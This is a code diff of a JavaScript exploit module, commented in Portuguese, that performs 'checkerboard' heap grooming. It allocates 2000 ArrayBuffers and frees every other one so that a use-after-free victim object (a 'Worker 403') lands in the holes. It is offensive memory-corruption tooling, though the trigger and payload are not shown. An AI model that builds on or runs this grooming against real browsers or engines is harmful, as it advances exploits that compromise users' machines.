@@ -2,32 +2,37 @@ import { log } from './utils.mjs';
 
 var grooming_stash = [];
 
-// Estratégia "Checkerboard" (Tabuleiro de Xadrez)
-// Aloca: [Ocupado] [Livre] [Ocupado] [Livre]
-// Isso fragmenta o Heap de propósito para capturar o objeto UAF.
 export function prepare_checkerboard_heap(size) {
-    log(`HEAP: Criando padrão Checkerboard para tamanho 0x${size.toString(16)}...`);
+    log(`HEAP: Preparando padrão Checkerboard para 0x${size.toString(16)}...`, "info");
     
     try {
-        // 1. Alocação Massiva
-        let temp_stash = [];
+        grooming_stash = []; // Limpa anterior
+        
+        // Aloca 2000 itens
+        let temp = [];
         for (let i = 0; i < 2000; i++) {
-            // Usamos ArrayBuffers do tamanho exato que estamos testando
             let ab = new ArrayBuffer(size);
-            temp_stash.push(ab);
+            temp.push(ab);
         }
 
-        // 2. Criar Buracos (Free alternado)
-        // Liberamos 1 a cada 2 (ou 3) para criar slots vazios
-        for (let i = 0; i < temp_stash.length; i += 2) {
-            temp_stash[i] = null; // O GC vai liberar estes slots
+        // Cria buracos (Libera 1 a cada 2)
+        // Padrão: [Ocupado] [Livre] [Ocupado] [Livre]
+        // O Worker 403 (Vítima) deve cair num desses buracos livres antes de ser liberado
+        let holes = 0;
+        for (let i = 0; i < temp.length; i += 2) {
+            temp[i] = null; // Libera para o GC
+            holes++;
         }
         
-        // Guardamos o resto para manter a estrutura
-        grooming_stash = temp_stash.filter(x => x !== null);
+        // Mantém os ocupados vivos para evitar coalescência total
+        grooming_stash = temp.filter(x => x !== null);
         
-        log("HEAP: Padrão criado. Buracos prontos para o UAF.", "success");
+        log(`HEAP: ${holes} buracos criados. Memória fragmentada.`, "success");
     } catch (e) {
         log("HEAP ERRO: " + e, "fail");
     }
+}
+
+export function clear_heap() {
+    grooming_stash = [];
 }
